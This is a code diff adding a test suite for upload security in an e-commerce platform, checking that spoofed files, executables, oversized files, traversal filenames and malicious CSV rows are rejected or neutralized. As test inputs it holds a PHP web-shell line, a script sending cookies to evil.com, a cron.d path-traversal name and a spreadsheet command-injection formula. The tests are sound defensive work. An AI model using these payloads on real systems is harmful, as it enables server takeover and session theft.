@@ -1116,5 +1116,220 @@ test.describe('Dhanshree Platform Core Engine Test Suite', () => {
       assert.equal(errorContent.includes('error.stack'), false, 'error.tsx must not render error.stack');
     });
   });
+
+  test.describe('File Upload Security & Code Execution Prevention', () => {
+    const { FileSecurityService } = require(path.resolve(__dirname, 'dist/modules/uploads/file-security.service.js'));
+    const { UploadsController } = require(path.resolve(__dirname, 'dist/modules/uploads/uploads.controller.js'));
+    const { AllowedFileCategory } = require(path.resolve(__dirname, 'dist/modules/uploads/interfaces/file-security.types.js'));
+    const { SellerService } = require(path.resolve(__dirname, 'dist/modules/sellers/seller.service.js'));
+
+    const service = new FileSecurityService();
+
+    test('Magic Number Validation: Accepts genuine image buffers (JPEG, PNG, WebP) and PDF documents', async () => {
+      // 1. Valid JPEG buffer (FF D8 FF E0 ...)
+      const jpegBuf = Buffer.from([0xff, 0xd8, 0xff, 0xe0, 0x00, 0x10, 0x4a, 0x46, 0x49, 0x46]);
+      const jpegRes = await service.processAndStoreFile(jpegBuf, 'product.jpg', 'image/jpeg', AllowedFileCategory.PRODUCT_IMAGE);
+      assert.equal(jpegRes.mimeType, 'image/jpeg');
+      assert.ok(jpegRes.fileId);
+
+      // 2. Valid PNG buffer (89 50 4E 47 0D 0A 1A 0A ...)
+      const pngBuf = Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a, 0x00, 0x00]);
+      const pngRes = await service.processAndStoreFile(pngBuf, 'banner.png', 'image/png', AllowedFileCategory.PRODUCT_IMAGE);
+      assert.equal(pngRes.mimeType, 'image/png');
+
+      // 3. Valid WebP buffer (RIFF....WEBP)
+      const webpBuf = Buffer.from([
+        0x52, 0x49, 0x46, 0x46, // RIFF
+        0x20, 0x00, 0x00, 0x00, // size
+        0x57, 0x45, 0x42, 0x50, // WEBP
+        0x56, 0x50, 0x38, 0x20,
+      ]);
+      const webpRes = await service.processAndStoreFile(webpBuf, 'thumb.webp', 'image/webp', AllowedFileCategory.PRODUCT_IMAGE);
+      assert.equal(webpRes.mimeType, 'image/webp');
+
+      // 4. Valid PDF buffer (%PDF-1.4...)
+      const pdfBuf = Buffer.from([0x25, 0x50, 0x44, 0x46, 0x2d, 0x31, 0x2e, 0x34]);
+      const pdfRes = await service.processAndStoreFile(pdfBuf, 'trade_license.pdf', 'application/pdf', AllowedFileCategory.KYC_DOCUMENT);
+      assert.equal(pdfRes.mimeType, 'application/pdf');
+    });
+
+    test('Extension Spoofing Rejection: Strictly rejects executable or text files disguised with image extensions', async () => {
+      // Attacker names PHP script or shell script as "avatar.png"
+      const fakePngBuf = Buffer.from('<?php echo "pwned"; system($_GET["cmd"]); ?>');
+
+      await assert.rejects(
+        async () => {
+          await service.processAndStoreFile(fakePngBuf, 'avatar.png', 'image/png', AllowedFileCategory.STORE_AVATAR);
+        },
+        (err) => {
+          assert.equal(err.status, 400);
+          assert.ok(err.message.includes('File content validation failed') || err.message.includes('binary signature'));
+          return true;
+        },
+      );
+
+      // Attacker names HTML with script as "document.pdf"
+      const fakePdfBuf = Buffer.from('<script>document.location="http://evil.com/steal?cookie="+document.cookie</script>');
+
+      await assert.rejects(
+        async () => {
+          await service.processAndStoreFile(fakePdfBuf, 'document.pdf', 'application/pdf', AllowedFileCategory.KYC_DOCUMENT);
+        },
+        (err) => {
+          assert.equal(err.status, 400);
+          return true;
+        },
+      );
+    });
+
+    test('Executable Header Detection: Rejects binary executables (Windows MZ, Linux ELF, Java Class)', async () => {
+      // Windows PE/DOS header (4D 5A)
+      const exeBuf = Buffer.from([0x4d, 0x5a, 0x90, 0x00, 0x03, 0x00, 0x00, 0x00]);
+      await assert.rejects(
+        async () => {
+          await service.processAndStoreFile(exeBuf, 'exploit.jpg', 'image/jpeg', AllowedFileCategory.PRODUCT_IMAGE);
+        },
+        (err) => {
+          assert.equal(err.status, 400);
+          return true;
+        },
+      );
+
+      // Linux ELF header (7F 45 4C 46)
+      const elfBuf = Buffer.from([0x7f, 0x45, 0x4c, 0x46, 0x02, 0x01, 0x01, 0x00]);
+      await assert.rejects(
+        async () => {
+          await service.processAndStoreFile(elfBuf, 'payload.jpg', 'image/jpeg', AllowedFileCategory.PRODUCT_IMAGE);
+        },
+        (err) => {
+          assert.equal(err.status, 400);
+          return true;
+        },
+      );
+    });
+
+    test('Size Limit Enforcement: Strictly rejects files exceeding category threshold', async () => {
+      // Category STORE_AVATAR has 2MB limit. Attempt to upload 2.5MB
+      const oversizedBuf = Buffer.alloc(2.5 * 1024 * 1024, 0xff);
+      oversizedBuf[0] = 0xff;
+      oversizedBuf[1] = 0xd8;
+      oversizedBuf[2] = 0xff; // valid JPEG magic bytes
+
+      await assert.rejects(
+        async () => {
+          await service.processAndStoreFile(oversizedBuf, 'giant_avatar.jpg', 'image/jpeg', AllowedFileCategory.STORE_AVATAR);
+        },
+        (err) => {
+          assert.equal(err.status, 400);
+          assert.ok(err.message.includes('exceeds maximum allowed limit'));
+          return true;
+        },
+      );
+    });
+
+    test('Storage Isolation & Non-Executable Filenames: Files are stored outside web root with randomized UUIDs', async () => {
+      const validPng = Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a]);
+      // Attacker attempts path traversal in originalName
+      const maliciousName = '../../../../../../etc/cron.d/backdoor.png';
+
+      const res = await service.processAndStoreFile(validPng, maliciousName, 'image/png', AllowedFileCategory.PRODUCT_IMAGE);
+
+      // Verify the storage path does NOT contain path traversal sequences
+      assert.equal(res.storagePath.includes('cron.d'), false);
+      assert.equal(res.storagePath.includes('..'), false);
+
+      // Verify the storage path is in isolated storage, NOT inside web public
+      assert.equal(res.storagePath.includes('apps\\web\\public'), false);
+      assert.equal(res.storagePath.includes('apps/web/public'), false);
+      assert.ok(res.storagePath.includes('isolated_storage'));
+
+      // Storage filename must be a randomized UUID
+      const storedFileName = path.basename(res.storagePath);
+      assert.ok(storedFileName.startsWith(res.fileId));
+      assert.equal(storedFileName.endsWith('.png'), true);
+    });
+
+    test('Anti-Execution Delivery Headers: Stream endpoints enforce nosniff, CSP sandbox, and safe disposition', () => {
+      const controller = new UploadsController(service);
+
+      // Mock response object
+      const resHeaders = {};
+      let sentBuffer = null;
+
+      const mockRes = {
+        setHeader: (k, v) => { resHeaders[k.toLowerCase()] = v; },
+        send: (b) => { sentBuffer = b; },
+        status: () => mockRes,
+        json: () => {},
+      };
+
+      // 1. Deliver image -> inline preview with nosniff and CSP sandbox
+      const testRecord = {
+        fileId: 'test-file-img',
+        category: AllowedFileCategory.PRODUCT_IMAGE,
+        mimeType: 'image/jpeg',
+        originalFileNameSanitized: 'camera.jpg',
+        sizeBytes: 100,
+        storagePath: '/mock/path',
+        publicUrl: '/api/v1/uploads/product_image/test-file-img',
+        uploadedAt: new Date().toISOString(),
+        sha256Hash: 'mock-hash',
+      };
+
+      service.fileRegistry.set(testRecord.fileId, testRecord);
+
+      controller.serveFile(testRecord.fileId, mockRes);
+
+      assert.equal(resHeaders['x-content-type-options'], 'nosniff', 'Must prevent MIME-sniffing execution');
+      assert.equal(resHeaders['content-security-policy'], "default-src 'none'; sandbox", 'Must sandbox preview execution');
+      assert.equal(resHeaders['content-type'], 'image/jpeg');
+      assert.equal(resHeaders['content-disposition'], 'inline; filename="camera.jpg"');
+
+      // 2. Deliver PDF/CSV -> forces attachment download to eliminate browser in-context script execution
+      const docRecord = {
+        fileId: 'test-file-doc',
+        category: AllowedFileCategory.KYC_DOCUMENT,
+        mimeType: 'application/pdf',
+        originalFileNameSanitized: 'company_reg.pdf',
+        sizeBytes: 200,
+        storagePath: '/mock/path',
+        publicUrl: '/api/v1/uploads/kyc_document/test-file-doc',
+        uploadedAt: new Date().toISOString(),
+        sha256Hash: 'mock-hash-doc',
+      };
+
+      service.fileRegistry.set(docRecord.fileId, docRecord);
+      controller.serveFile(docRecord.fileId, mockRes);
+
+      assert.equal(resHeaders['content-disposition'], 'attachment; filename="company_reg.pdf"', 'Documents must be served as attachment');
+    });
+
+    test('Bulk CSV Hardening: Rejects script injection and neutralizes formula injection (CWE-1236)', () => {
+      const sellerService = new SellerService({});
+
+      // 1. Rejects CSV with embedded script tags
+      const maliciousScriptCsv = `sku,title,price\nSKU-1,<script>alert("xss")</script>,100`;
+      assert.throws(
+        () => {
+          sellerService.bulkUploadProducts('seller-1', maliciousScriptCsv);
+        },
+        (err) => {
+          assert.equal(err.status, 400);
+          assert.ok(err.message.includes('disallowed script or HTML markup'));
+          return true;
+        },
+      );
+
+      // 2. Neutralizes formula injection (=cmd|' /C calc'!A0) by prepending quote
+      const formulaCsv = `sku,title,category,price,stock,warehouse\nSKU-2,=cmd|' /C calc'!A0,Audio,500,10,Main WH`;
+      const result = sellerService.bulkUploadProducts('seller-1', formulaCsv);
+
+      assert.equal(result.successfulRows, 1);
+      const importedItem = result.importedProducts[0];
+      // Title must have leading single quote prepended to neutralize formula execution in Excel/Calc
+      assert.ok(importedItem.title.startsWith("'="), 'Formula trigger must be neutralized with leading apostrophe');
+    });
+  });
 });
+
 
